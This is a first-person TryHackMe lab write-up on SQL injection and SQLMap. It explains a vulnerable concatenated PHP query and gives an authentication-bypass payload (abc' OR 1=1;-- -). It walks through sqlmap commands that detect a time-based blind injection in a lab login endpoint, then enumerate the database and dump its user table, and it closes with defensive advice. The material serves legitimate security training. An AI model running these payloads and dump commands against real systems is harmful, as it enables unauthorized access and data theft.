# SQLMap: The Basics

> **Room:** SQLMap: The Basics  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Status:** Completed

---

# Executive Summary

SQL Injection (SQLi) is one of the most well-known and impactful web application vulnerabilities. It occurs when an application fails to properly validate or sanitize user input before incorporating it into SQL queries. As a result, attackers can manipulate those queries to interact with the database in unintended ways, potentially exposing sensitive information or bypassing authentication.

In this room, I learned the fundamentals of SQL Injection and how databases interact with web applications through SQL queries. Instead of manually crafting SQL injection payloads, this room focused on **SQLMap**, an automated penetration testing tool capable of detecting and exploiting SQL injection vulnerabilities.

Through both theory and hands-on practice, I learned how to:

- Understand how SQL Injection vulnerabilities occur.
- Identify SQL injection points in web applications.
- Use SQLMap to detect vulnerable parameters.
- Fingerprint the backend database management system (DBMS).
- Enumerate databases, tables, and records.
- Extract information from a vulnerable database in an authorized lab environment.

The practical exercise simulated a real penetration testing workflow, demonstrating how a security professional can move from identifying a vulnerable parameter to safely enumerating database contents using SQLMap.

---

# Learning Objectives

By completing this room, I learned how to:

- Understand how SQL Injection vulnerabilities work.
- Explain how web applications communicate with databases.
- Identify SQL Injection vulnerabilities in HTTP requests.
- Use SQLMap to automate SQL Injection testing.
- Enumerate databases, tables, columns, and records.
- Interpret SQLMap scan results.
- Understand different SQL Injection techniques supported by SQLMap.
- Recognize defensive measures against SQL Injection.

---

# Prerequisites

Although this room is beginner-friendly, having prior knowledge of the following topics is beneficial:

- Basic Linux commands
- HTTP requests and responses
- SQL Fundamentals
- Basic web application architecture
- Browser Developer Tools
- Basic understanding of databases

---

# Room Overview

This room introduces one of the most common web vulnerabilities found during penetration testing: **SQL Injection**.

Instead of manually crafting SQL injection payloads, the room teaches how to use **SQLMap**, an open-source tool that automates the detection and exploitation of SQL Injection vulnerabilities.

The room combines theory with practical exercises, allowing learners to understand not only **how SQLMap works**, but also **why SQL Injection occurs** in vulnerable applications.

---

# What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to manipulate SQL queries executed by a web application.

When user input is directly inserted into SQL statements without proper validation or parameterization, attackers may inject additional SQL syntax that changes the intended behavior of the query.

For example, a login form normally generates a query similar to:

```sql
SELECT *
FROM users
WHERE username='John'
AND password='Un@detectable444';
```

If the application improperly handles user input, an attacker may inject malicious SQL syntax that modifies the query logic, potentially bypassing authentication or retrieving unauthorized information.

SQL Injection remains one of the most critical web vulnerabilities because databases often contain sensitive information such as:

- User accounts
- Password hashes
- Personal information
- Financial records
- Internal application data
- Configuration information

---

# How Web Applications Communicate with Databases

Most modern web applications rely on a Database Management System (DBMS) to store and retrieve information.

A simplified request flow looks like this:

```text
User
   │
   ▼
Web Browser
   │
   ▼
Web Application
   │
   ▼
SQL Query
   │
   ▼
Database Server
   │
   ▼
Query Result
   │
   ▼
Web Application
   │
   ▼
User
```

Whenever a user:

- logs in,
- searches for products,
- views their profile,
- updates information,

the web application typically generates SQL queries that interact with the database.

If these queries are constructed insecurely, attackers may be able to modify them through SQL Injection.

---

# What is SQLMap?

SQLMap is an open-source command-line tool that automates the detection and exploitation of SQL Injection vulnerabilities.

Rather than manually testing hundreds of payloads, SQLMap performs the work automatically by:

- Detecting SQL Injection vulnerabilities
- Identifying the backend DBMS
- Discovering available databases
- Enumerating tables and columns
- Dumping database records
- Supporting multiple SQL Injection techniques

SQLMap significantly speeds up the assessment process while reducing the manual effort required during authorized penetration tests.

---

# Skills Learned

Throughout this room, I developed practical experience with:

- SQL Injection fundamentals
- SQLMap usage
- HTTP GET parameter testing
- SQL Injection detection
- Database fingerprinting
- Database enumeration
- Table enumeration
- Column enumeration
- Record extraction
- SQLMap command-line usage
- Web application security assessment
- Understanding SQL Injection attack workflows

---

# Technologies Used

| Technology | Purpose |
|------------|---------|
| SQL | Database querying language |
| SQLMap | Automated SQL Injection framework |
| HTTP | Communication between browser and server |
| Apache | Web server |
| MariaDB / MySQL | Backend database |
| Linux | Attack environment |
| Browser Developer Tools | Capturing HTTP requests |

---

# Key Terminology

| Term | Description |
|------|-------------|
| SQL | Structured Query Language used to communicate with relational databases. |
| SQL Injection | A vulnerability that allows attackers to manipulate SQL queries. |
| SQLMap | An automated SQL Injection testing tool. |
| DBMS | Database Management System (e.g., MySQL, MariaDB, PostgreSQL). |
| Enumeration | The process of gathering information about a target system. |
| GET Parameter | Data sent through the URL that can sometimes become an injection point. |
| Blind SQL Injection | A technique where attackers infer information without directly seeing query results. |
| Time-Based SQL Injection | Blind SQL Injection using response delays (e.g., `SLEEP()`) to confirm successful payload execution. |
| Database Fingerprinting | Identifying the database technology used by the target application. |

---

# Lab Environment

The practical exercise consisted of:

- An AttackBox running Linux
- A deliberately vulnerable web application
- A login page vulnerable to SQL Injection
- SQLMap for automated exploitation
- Browser Developer Tools for extracting HTTP requests

The objective was to identify a vulnerable parameter and use SQLMap to enumerate and extract database information in a controlled lab environment.

---

# Skills Gained

After completing this room, I can confidently:

- Explain how SQL Injection works internally.
- Describe how insecure SQL queries create vulnerabilities.
- Use SQLMap to automate SQL Injection testing.
- Interpret SQLMap output.
- Enumerate databases and tables.
- Extract records from vulnerable databases.
- Understand the workflow followed by penetration testers when assessing SQL Injection vulnerabilities.

---

# SQL Injection Fundamentals

Understanding SQL Injection requires understanding how web applications communicate with databases. Rather than viewing SQL Injection as "magic" or simply memorizing payloads, it is important to understand **why** the vulnerability exists in the first place.

---

# How Authentication Works

Consider a typical login page.

```text
Username: ___________

Password: ___________

        [ Login ]
```

When a user enters their credentials, the browser sends them to the web server.

The web application then constructs an SQL query similar to the following:

```sql
SELECT *
FROM users
WHERE username='John'
AND password='Un@detectable444';
```

This query is sent to the database.

The database searches for a record where **both** conditions are true:

- Username equals `John`
- Password equals `Un@detectable444`

If a matching record exists, the database returns the user's information, and the application grants access.

The authentication process can be visualized as follows:

```text
User
 │
 │ Username & Password
 ▼
Web Application
 │
 │ Builds SQL Query
 ▼
Database
 │
 │ Query Result
 ▼
Authenticated User
```

---

# Breaking Down the SQL Query

Consider the following statement:

```sql
SELECT *
FROM users
WHERE username='John'
AND password='Un@detectable444';
```

Each part has a specific purpose.

## SELECT *

Retrieve every column from the matching record.

---

## FROM users

Search inside the `users` table.

---

## WHERE

Apply filtering conditions.

---

## username='John'

Find the record where the username is **John**.

---

## AND

Both conditions must evaluate to **TRUE**.

---

## password='Un@detectable444'

Verify that the password also matches.

The logic can be represented like this:

```text
Username Correct?

      │
      ▼
 Password Correct?

      │
      ▼
 Login Successful
```

If either condition fails, authentication fails.

---

# Why SQL Injection Happens

SQL Injection occurs when applications build SQL queries by directly concatenating user input into SQL statements.

A simplified vulnerable implementation looks like this:

```php
$query = "SELECT * FROM users
WHERE username='$username'
AND password='$password'";
```

Instead of treating user input as data, the application treats it as part of the SQL syntax.

This allows attackers to inject additional SQL code.

The root cause is **improper input handling**, not the database itself.

---

# Authentication Bypass Example

Suppose an attacker enters the following credentials.

**Username**

```text
John
```

**Password**

```text
abc' OR 1=1;-- -
```

The resulting SQL query becomes:

```sql
SELECT *
FROM users
WHERE username='John'
AND password='abc'
OR 1=1;-- -';
```

This query is significantly different from the intended query because the attacker has successfully modified its logic.

---

# Understanding the Injection

Let's break the query apart.

```sql
username='John'
```

Checks whether the username exists.

---

```sql
password='abc'
```

Checks the supplied password.

This condition fails.

---

```sql
OR 1=1
```

Introduces a condition that always evaluates to **TRUE**.

---

```sql
-- -
```

Comments out the remaining portion of the SQL statement.

The query effectively becomes:

```sql
SELECT *
FROM users
WHERE username='John'
AND password='abc'
OR 1=1;
```

Because the injected logic changes how the database evaluates the statement, the application's authentication process can be bypassed when the vulnerable query is interpreted by the database.

---

# Why the Single Quote Matters

Many beginners wonder why payloads contain a single quote (`'`).

Without it, the payload would simply become part of the password string.

For example:

```text
Password

abc OR 1=1
```

Produces:

```sql
password='abc OR 1=1'
```

Everything remains inside the string.

Nothing is executed.

---

Adding a single quote closes the original string.

```text
abc'
```

The query becomes:

```sql
password='abc'
```

Everything after the closing quote is now interpreted as SQL syntax instead of password data.

This is the point where SQL Injection begins.

---

# Why Comments Are Used

The payload commonly ends with:

```sql
-- -
```

This starts an SQL comment.

Everything after the comment is ignored by the database.

Example:

```sql
SELECT *
FROM users
WHERE username='John'
AND password='abc'
OR 1=1;-- -';
```

The remaining characters after the comment are discarded, preventing SQL syntax errors.

---

# SQL Injection Lifecycle

A typical SQL Injection attack follows this sequence:

```text
User Input
      │
      ▼
Application Builds SQL Query
      │
      ▼
User Input Alters Query Structure
      │
      ▼
Database Executes Modified Query
      │
      ▼
Unexpected Results Returned
```

The vulnerability exists because the application allows user input to become part of the SQL statement.

---

# Common SQL Injection Techniques

SQLMap supports multiple SQL Injection techniques.

## Boolean-Based Blind

Determines whether injected conditions are true or false based on differences in the application's responses.

Example concept:

```sql
AND 1=1
```

versus

```sql
AND 1=2
```

---

## Error-Based SQL Injection

Intentionally generates database errors that reveal useful information such as:

- Database version
- Database name
- Table names
- Column names

---

## Time-Based Blind SQL Injection

Uses time delays to determine whether injected SQL statements execute successfully.

Typical functions include:

```sql
SLEEP(5)
```

If the server pauses before responding, SQLMap can infer that the payload executed.

---

## UNION-Based SQL Injection

Uses the SQL `UNION` operator to combine attacker-controlled queries with legitimate application queries.

When successful, database contents may be displayed directly within the application's normal response.

---

# SQL Injection Impact

A successful SQL Injection vulnerability can allow attackers to:

- Bypass authentication
- Read sensitive information
- Enumerate databases
- Discover tables
- Dump database records
- Read configuration information
- Obtain password hashes
- Modify database contents (depending on privileges)

The overall impact depends largely on the permissions granted to the application's database account.

---

# Defensive Best Practices

Modern applications should prevent SQL Injection by implementing multiple layers of defense.

Recommended mitigations include:

- Parameterized queries (Prepared Statements)
- Input validation
- Output encoding where appropriate
- Principle of Least Privilege
- Secure error handling
- Web Application Firewalls (WAF)
- Regular security testing

Prepared statements are considered the primary defense because they ensure user input is always treated as data rather than executable SQL syntax.

---

# Red Team Notes

From an attacker's perspective, SQL Injection is valuable because it can:

- Bypass authentication
- Enumerate databases
- Extract sensitive information
- Identify backend technologies
- Escalate the impact of a web application compromise

Modern penetration testing often combines manual SQL Injection testing with automated tools such as SQLMap.

---

# Blue Team Notes

Defenders should monitor for indicators such as:

- Unexpected SQL syntax within requests
- Repeated requests containing SQL keywords
- Excessive database errors
- Time-delay payloads
- Automated scanning behavior

Developers should assume that **every user input is untrusted** until properly validated and safely handled.

---

# Key Takeaways

- SQL Injection is caused by insecure SQL query construction.
- The database is not vulnerable by itself—the application is.
- User input should never become executable SQL code.
- A single quote (`'`) changes where user input ends and SQL syntax begins.
- Comments (`--`) help attackers ignore unwanted portions of SQL queries.
- SQLMap automates these techniques but relies on the same underlying SQL Injection principles.
- Understanding SQL Injection manually is essential before relying on automated tools.

---

**Next Part:** SQLMap Fundamentals and Automated SQL Injection

# SQLMap Fundamentals

After understanding how SQL Injection works manually, the next step is learning how penetration testers automate the testing process.

Testing SQL Injection manually can be slow and time-consuming because every payload must be crafted, sent, and analyzed individually. SQLMap automates these repetitive tasks, allowing security professionals to focus on analyzing the results instead of manually testing hundreds of payloads.

---

# What is SQLMap?

SQLMap is an open-source command-line tool designed to detect and exploit SQL Injection vulnerabilities automatically.

Instead of manually testing payloads such as:

```sql
'
```

```sql
OR 1=1
```

```sql
UNION SELECT ...
```

```sql
SLEEP(5)
```

SQLMap performs these tests automatically while analyzing the application's responses.

Internally, SQLMap continuously sends HTTP requests, injects different payloads, compares server responses, and determines whether a parameter is vulnerable.

---

# How SQLMap Works

A simplified workflow looks like this:

```text
Target URL
      │
      ▼
Detect Parameters
      │
      ▼
Send SQL Injection Payloads
      │
      ▼
Analyze Responses
      │
      ▼
Identify Injection Technique
      │
      ▼
Fingerprint DBMS
      │
      ▼
Enumerate Database
      │
      ▼
Extract Data
```

Unlike manual testing, SQLMap performs these steps automatically.

---

# SQLMap Workflow

During a penetration test, SQLMap generally follows this sequence:

```text
Target URL
      │
      ▼
Detect SQL Injection
      │
      ▼
Identify DBMS
      │
      ▼
Identify Injection Technique
      │
      ▼
Enumerate Databases
      │
      ▼
Enumerate Tables
      │
      ▼
Enumerate Columns
      │
      ▼
Dump Records
```

This workflow mirrors the methodology commonly followed during authorized web application security assessments.

---

# SQLMap Installation

Many penetration testing distributions already include SQLMap.

For example:

- Kali Linux
- Parrot Security OS
- TryHackMe AttackBox

If SQLMap is not installed, it can be installed manually from its official repository.

---

# Getting Help

The help menu displays every available option.

```bash
sqlmap --help
```

## Purpose

Displays all available commands and options.

---

## Example

```bash
sqlmap --help
```

The help menu includes options for:

- Detection
- Enumeration
- Authentication
- Cookies
- Proxy Support
- Crawling
- File Operations
- OS Interaction
- Tamper Scripts

SQLMap provides hundreds of configurable options, making it one of the most feature-rich SQL Injection frameworks available.

---

# Wizard Mode

SQLMap also includes an interactive mode for beginners.

```bash
sqlmap --wizard
```

Instead of requiring users to remember numerous command-line options, the wizard asks questions step-by-step.

Typical prompts include:

- Target URL
- Injection options
- Enumeration choices

Wizard mode is an excellent way to learn SQLMap before using more advanced commands.

---

# Identifying a Target

SQLMap requires an HTTP request to test.

One of the most common targets is a URL containing GET parameters.

Example:

```text
http://example.com/search?category=1
```

The parameter

```text
category=1
```

is a possible injection point.

If the application directly inserts this value into an SQL query, SQL Injection may become possible.

---

# GET-Based Testing

Testing GET parameters is straightforward.

Example:

```bash
sqlmap -u "http://example.com/search?category=1"
```

## Command Breakdown

| Option | Description |
|---------|-------------|
| `sqlmap` | Launch SQLMap |
| `-u` | Specify the target URL |
| `"URL"` | Target including GET parameters |

SQLMap automatically tests every injectable parameter contained within the URL.

---

# POST-Based Testing

Not every application sends data through URL parameters.

Login pages usually use POST requests.

Example request body:

```text
username=admin
password=test123
```

In this case, SQLMap requires the intercepted HTTP request.

Example:

```bash
sqlmap -r login_request.txt
```

## Purpose

Read a raw HTTP request captured from a browser or proxy.

This approach allows SQLMap to test forms that are inaccessible through simple URLs.

---

# Cookie-Based Testing

Some applications require authentication before reaching vulnerable pages.

Unauthenticated requests may return:

- 401 Unauthorized
- 403 Forbidden
- Redirects to the login page

SQLMap supports authenticated sessions using cookies.

Example:

```bash
sqlmap --cookie="PHPSESSID=abcdef123456"
```

This allows SQLMap to send requests as an authenticated user.

---

# Detecting SQL Injection

A basic scan looks like this:

```bash
sqlmap -u "http://example.com/search?id=1"
```

During the scan SQLMap:

1. Connects to the target.
2. Detects dynamic parameters.
3. Sends numerous payloads.
4. Compares responses.
5. Determines whether SQL Injection exists.

If successful, SQLMap reports information such as:

- Vulnerable parameter
- Injection type
- Backend DBMS
- Web server
- Operating system

---

# Fingerprinting the Backend

One of SQLMap's most valuable capabilities is backend fingerprinting.

Example output:

```text
Back-end DBMS: MySQL
```

SQLMap attempts to determine:

- MySQL
- MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

Knowing the DBMS allows SQLMap to use payloads specifically designed for that database.

---

# SQL Injection Techniques Detected by SQLMap

SQLMap supports numerous SQL Injection techniques.

## Boolean-Based Blind

Uses true/false conditions to determine whether SQL Injection exists.

Example concept:

```sql
AND 1=1
```

---

## Error-Based

Extracts information through database error messages.

Useful for revealing:

- Database version
- Table names
- Column names

---

## Time-Based Blind

Uses deliberate response delays.

Example:

```sql
SLEEP(5)
```

If the application pauses before responding, SQLMap can infer that the injected statement executed successfully.

---

## UNION-Based

Uses SQL's `UNION` operator to combine attacker-controlled queries with legitimate application queries.

When successful, application responses may directly display database contents.

---

# Common Enumeration Commands

## Detect SQL Injection

```bash
sqlmap -u "TARGET_URL"
```

---

## List Databases

```bash
sqlmap -u "TARGET_URL" --dbs
```

---

## List Tables

```bash
sqlmap -u "TARGET_URL" -D database_name --tables
```

---

## List Columns

```bash
sqlmap -u "TARGET_URL" -D database_name -T table_name --columns
```

---

## Dump Records

```bash
sqlmap -u "TARGET_URL" -D database_name -T table_name --dump
```

These commands represent the most common SQLMap workflow during an authorized penetration test.

---

# Practical Workflow

The overall process can be summarized as:

```text
Identify Target
        │
        ▼
Run SQLMap
        │
        ▼
Detect SQL Injection
        │
        ▼
Identify Database
        │
        ▼
Enumerate Databases
        │
        ▼
Enumerate Tables
        │
        ▼
Enumerate Columns
        │
        ▼
Dump Records
```

This systematic approach helps testers move from vulnerability discovery to impact assessment.

---

# Red Team Notes

SQLMap greatly reduces the time required to assess SQL Injection vulnerabilities.

Instead of manually crafting hundreds of payloads, penetration testers can focus on:

- Identifying attack surfaces
- Validating findings
- Assessing business impact
- Producing evidence for security reports

Automation improves efficiency but does not replace understanding how SQL Injection works internally.

---

# Blue Team Notes

Understanding SQLMap also benefits defenders.

Security teams can:

- Recognize automated scanning behavior.
- Detect repeated SQL Injection payloads.
- Monitor unusual HTTP requests.
- Identify time-based attacks.
- Test internal applications before deployment.

Proper use of parameterized queries and secure coding practices remains the best defense against SQL Injection.

---

# Key Takeaways

- SQLMap automates SQL Injection testing.
- It supports multiple SQL Injection techniques.
- SQLMap identifies vulnerable parameters and backend databases automatically.
- Enumeration follows a logical workflow: databases → tables → columns → records.
- Understanding SQL Injection manually is essential before relying on automation.
- SQLMap is a productivity tool, not a substitute for penetration testing knowledge.

---

**Next Part:** Practical Lab Walkthrough

# Practical Lab Walkthrough

In this practical exercise, the objective was to identify a SQL Injection vulnerability in a deliberately vulnerable web application and use SQLMap to enumerate the backend database.

Unlike the previous theoretical tasks, this lab follows a realistic penetration testing workflow where the tester must first identify the HTTP request before attempting SQL Injection.

> **Note:** All activities performed in this walkthrough were conducted inside the TryHackMe lab environment on a machine intentionally designed for learning purposes.

---

# Lab Scenario

The vulnerable application provided a login page located at:

```text
http://<TARGET-IP>/ai/login
```

Although the login form appeared simple, the application submitted authentication data using an HTTP GET request.

Unlike previous examples, the GET parameters were not directly visible in the browser's address bar.

Therefore, the first task was to discover the complete request.

---

# Step 1 — Discovering the Request

The browser's Developer Tools were used to inspect network traffic.

The workflow was:

```text
Open Login Page
        │
        ▼
Press F12
        │
        ▼
Network Tab
        │
        ▼
Enter Test Credentials
        │
        ▼
Click Login
        │
        ▼
Inspect HTTP Request
```

The captured request revealed the actual endpoint used by the application.

Example:

```text
http://<TARGET-IP>/ai/includes/user_login?email=test&password=test
```

This URL became the target for SQLMap testing.

---

# Why the URL Was Wrapped in Quotes

The complete URL was enclosed in single quotes.

Example:

```bash
sqlmap -u 'http://<TARGET-IP>/ai/includes/user_login?email=test&password=test'
```

This prevents the shell from interpreting special characters such as:

- `?`
- `&`

Without quoting the URL, Linux may incorrectly process parts of the command.

---

# Step 2 — Initial SQLMap Scan

The first scan was performed using:

```bash
sqlmap -u 'http://<TARGET-IP>/ai/includes/user_login?email=test&password=test' --level=5
```

## Command Breakdown

| Option | Purpose |
|---------|----------|
| `-u` | Target URL |
| `--level=5` | Perform deeper SQL Injection testing |

---

# Why Use `--level=5`?

SQLMap uses Level 1 by default.

Higher levels cause SQLMap to test:

- More payloads
- More parameters
- More HTTP headers
- Additional SQL Injection techniques

Although scans become slower, detection accuracy improves.

For this lab, deeper testing was required to identify the vulnerability successfully.

---

# SQLMap Interactive Prompts

During the scan, SQLMap asked several questions.

## Skip Other Database Payloads

```text
It looks like the back-end DBMS is MySQL.
Do you want to skip payloads specific for other DBMSes?
```

Response:

```text
y
```

Once SQLMap identifies the backend database, there is little benefit in testing payloads intended for different database engines.

---

## Include Additional MySQL Tests

```text
Do you want to include all tests for MySQL?
```

Response:

```text
y
```

This instructs SQLMap to perform additional payloads designed specifically for MySQL-compatible databases.

---

## UNION Character Optimization

```text
Injection not exploitable with NULL values.
Try random integer?
```

Response:

```text
y
```

SQLMap automatically attempts alternative payloads when standard UNION-based payloads are unsuccessful.

---

## Continue Testing Other Parameters

```text
GET parameter 'email' is vulnerable.
Continue testing others?
```

Response:

```text
n
```

Since a vulnerable parameter had already been identified, additional testing was unnecessary.

---

# Step 3 — SQL Injection Detection

After completing the scan, SQLMap reported that the **email** parameter was vulnerable.

Example output:

```text
Parameter: email (GET)

Type: time-based blind

Back-end DBMS:
MySQL (MariaDB)
```

This tells us several important things:

- The vulnerable parameter is **email**
- The request method is **GET**
- SQLMap identified **Time-Based Blind SQL Injection**
- The backend database is **MariaDB (MySQL compatible)**

---

# Understanding Time-Based Blind SQL Injection

Unlike UNION-based or Error-based SQL Injection, this application did not reveal query results directly.

Instead, SQLMap confirmed the vulnerability by measuring server response times.

A simplified payload concept is:

```sql
SLEEP(5)
```

Workflow:

```text
Send Payload
      │
      ▼
Database Executes SLEEP()
      │
      ▼
Server Delays Response
      │
      ▼
SQLMap Detects Delay
      │
      ▼
SQL Injection Confirmed
```

Although slower than other SQL Injection techniques, Time-Based Blind SQL Injection remains highly reliable when no visible output is available.

---

# Step 4 — Database Enumeration

After identifying the SQL Injection vulnerability, the next step was to enumerate available databases.

Command:

```bash
sqlmap -u 'TARGET_URL' --dbs --level=5
```

SQLMap successfully identified the available database used by the application.

Example:

```text
available databases

ai
```

Database enumeration allows penetration testers to understand the backend structure before extracting additional information.

---

# Step 5 — Table Enumeration

Once the database had been identified, the next objective was to discover its tables.

Command:

```bash
sqlmap -u 'TARGET_URL' -D ai --tables
```

Result:

```text
Database: ai

user
```

The application contained a single table named:

```text
user
```

At this point, the database structure looked like:

```text
Database
   │
   ▼
ai
   │
   ▼
user
```

---

# Step 6 — Dumping Table Contents

Finally, the records inside the table were extracted.

Command:

```bash
sqlmap -u 'TARGET_URL' -D ai -T user --dump
```

SQLMap automatically performed the following tasks:

1. Enumerated columns.
2. Retrieved table entries.
3. Exported the results.

The discovered columns included:

- id
- email
- password
- created

The retrieved record confirmed that SQLMap successfully extracted data from the vulnerable database.

---

# SQLMap Output Files

SQLMap automatically stores its findings.

Example location:

```text
/root/.local/share/sqlmap/output/<TARGET-IP>/
```

The exported table data was also saved as a CSV file.

This feature is useful during professional penetration tests because it preserves evidence for later analysis and reporting.

---

# Practical Workflow Summary

The complete workflow performed during this lab can be summarized as:

```text
Identify Login Request
          │
          ▼
Capture HTTP Request
          │
          ▼
Extract GET Parameters
          │
          ▼
Run SQLMap
          │
          ▼
Detect SQL Injection
          │
          ▼
Identify Backend DBMS
          │
          ▼
Enumerate Database
          │
          ▼
Enumerate Tables
          │
          ▼
Enumerate Columns
          │
          ▼
Dump Records
```

---

# Lessons Learned

This practical exercise demonstrated that SQLMap is much more than a simple vulnerability scanner.

A typical SQLMap assessment includes:

- Discovering vulnerable parameters
- Fingerprinting backend technologies
- Enumerating databases
- Exploring database structures
- Extracting records
- Automatically documenting findings

More importantly, the exercise reinforced that successful SQL Injection exploitation follows a systematic methodology rather than randomly executing commands.

---

# Key Takeaways

- Browser Developer Tools can be used to identify hidden HTTP requests.
- SQLMap requires the actual request sent to the server.
- The `--level` option increases testing depth.
- Time-Based Blind SQL Injection relies on response timing rather than visible output.
- SQLMap can automatically enumerate databases, tables, columns, and records after identifying a vulnerable parameter.
- Following a structured workflow leads to more efficient and reliable penetration testing.

---

**Next Part:** Database Enumeration, Challenge Solutions, and Conclusion

# Conclusion

This room introduced the fundamentals of SQL Injection and demonstrated how penetration testers automate SQL Injection testing using SQLMap.

Rather than manually crafting payloads and analyzing every response, SQLMap streamlines the entire assessment process by automatically detecting injection points, fingerprinting the backend database, enumerating database objects, and extracting data from vulnerable applications.

Although SQLMap significantly reduces manual effort, the room also emphasized that understanding **how SQL Injection works internally** is far more important than simply learning SQLMap commands. Automated tools are only effective when the tester understands the underlying vulnerability.

---

# Challenge Walkthrough

## Objective

Assess a vulnerable login page for SQL Injection and enumerate the backend database using SQLMap.

---

## Step 1 — Capture the Request

The login page submitted credentials using a GET request.

Using the browser's Developer Tools (Network tab), the complete request was identified:

```text
http://<TARGET-IP>/ai/includes/user_login?email=test&password=test
```

This URL became the SQLMap target.

---

## Step 2 — Detect SQL Injection

The initial scan was performed with:

```bash
sqlmap -u 'http://<TARGET-IP>/ai/includes/user_login?email=test&password=test' --level=5
```

### Result

SQLMap identified:

- Vulnerable parameter: `email`
- Request method: GET
- Injection technique: Time-Based Blind SQL Injection
- Backend DBMS: MariaDB (MySQL compatible)

---

## Step 3 — Enumerate Databases

Command:

```bash
sqlmap -u 'TARGET_URL' --dbs --level=5
```

### Result

The application database was identified as:

```text
ai
```

---

## Step 4 — Enumerate Tables

Command:

```bash
sqlmap -u 'TARGET_URL' -D ai --tables
```

### Result

The database contained a single table:

```text
user
```

---

## Step 5 — Dump Records

Command:

```bash
sqlmap -u 'TARGET_URL' -D ai -T user --dump
```

### Result

SQLMap successfully enumerated the table structure and extracted the available record.

Columns discovered:

- id
- email
- password
- created

SQLMap also exported the retrieved data to a CSV file for later analysis.

---

# Commands Used

| Command | Purpose |
|----------|---------|
| `sqlmap --help` | Display all available SQLMap options |
| `sqlmap --wizard` | Launch the interactive wizard |
| `sqlmap -u URL` | Test a target URL for SQL Injection |
| `sqlmap -u URL --dbs` | Enumerate available databases |
| `sqlmap -u URL -D database --tables` | Enumerate tables |
| `sqlmap -u URL -D database -T table --columns` | Enumerate table columns |
| `sqlmap -u URL -D database -T table --dump` | Extract table records |
| `sqlmap -r request.txt` | Test an intercepted HTTP request |
| `--cookie` | Include authenticated session cookies |
| `--level=5` | Perform deeper SQL Injection testing |

---

# Practical Skills Gained

Completing this room strengthened my understanding of:

- SQL Injection fundamentals
- SQL query manipulation
- SQLMap usage
- Browser Developer Tools
- HTTP request analysis
- GET parameter testing
- SQL Injection detection
- Backend DBMS fingerprinting
- Database enumeration
- Table enumeration
- Column enumeration
- Record extraction
- SQLMap workflow
- Basic web application security testing

---

# Red Team Takeaways

From an offensive security perspective, this room demonstrated the standard workflow used after discovering a SQL Injection vulnerability:

1. Identify a vulnerable parameter.
2. Confirm the injection technique.
3. Fingerprint the backend DBMS.
4. Enumerate available databases.
5. Enumerate tables and columns.
6. Extract relevant information.
7. Preserve evidence for reporting.

The room also reinforced that SQLMap is a productivity tool rather than a replacement for understanding SQL Injection.

---

# Blue Team Takeaways

From a defensive perspective, several important lessons emerged:

- Never concatenate user input directly into SQL queries.
- Always use parameterized queries (prepared statements).
- Validate and sanitize user input.
- Apply the Principle of Least Privilege to database accounts.
- Store passwords using secure hashing algorithms rather than plaintext.
- Limit database error messages returned to users.
- Monitor logs for automated SQL Injection attempts.

Understanding SQLMap also helps defenders recognize how attackers automate SQL Injection attacks and what evidence those attacks leave behind.

---

# Common Mistakes

Beginners often make the following mistakes:

- Memorizing SQLMap commands without understanding SQL Injection.
- Running `--dump` immediately without proper enumeration.
- Assuming every SQL Injection behaves the same.
- Ignoring HTTP requests and testing only visible URLs.
- Treating SQLMap as a "one-click hacking tool."

Professional penetration testing requires understanding both the vulnerability and the automation tool.

---

# Key Takeaways

- SQL Injection results from insecure SQL query construction.
- SQLMap automates SQL Injection detection and exploitation.
- Enumeration follows a logical sequence:
  - Database
  - Tables
  - Columns
  - Records
- Different SQL Injection techniques require different testing methods.
- Time-Based Blind SQL Injection relies on measuring response delays.
- SQLMap greatly improves efficiency but cannot replace technical knowledge.

---

# Future Learning Path

This room provides a strong foundation for more advanced web application security topics.

Recommended next subjects include:

- Manual SQL Injection
- Blind SQL Injection
- Error-Based SQL Injection
- UNION-Based SQL Injection
- Burp Suite Repeater
- Burp Suite Intruder
- Authentication Testing
- Session Management
- Web Application Enumeration
- OWASP Top 10
- Web Exploitation Methodology

---

# References

- TryHackMe — SQLMap: The Basics
- SQLMap Official Documentation
- OWASP SQL Injection Prevention Cheat Sheet
- PortSwigger Web Security Academy

---

# Final Thoughts

This room successfully bridges the gap between **understanding SQL Injection** and **using industry-standard tooling to assess it**.

Rather than simply demonstrating SQLMap commands, the room teaches the complete methodology followed by penetration testers when assessing SQL Injection vulnerabilities—from identifying vulnerable parameters to enumerating backend databases and extracting evidence in a controlled environment.

Understanding this workflow is essential because effective penetration testing depends not only on using automated tools, but also on understanding **why the vulnerability exists, how the tool reaches its conclusions, and how to interpret the results responsibly**.

---

# Tags

`#TryHackMe`
`#SQLMap`
`#SQLInjection`
`#WebSecurity`
`#WebPentesting`
`#Database`
`#MariaDB`
`#MySQL`
`#CyberSecurity`
`#EthicalHacking`
`#RedTeam`
`#BlueTeam`
`#OWASP`
`#Linux`
`#CyberJourney`
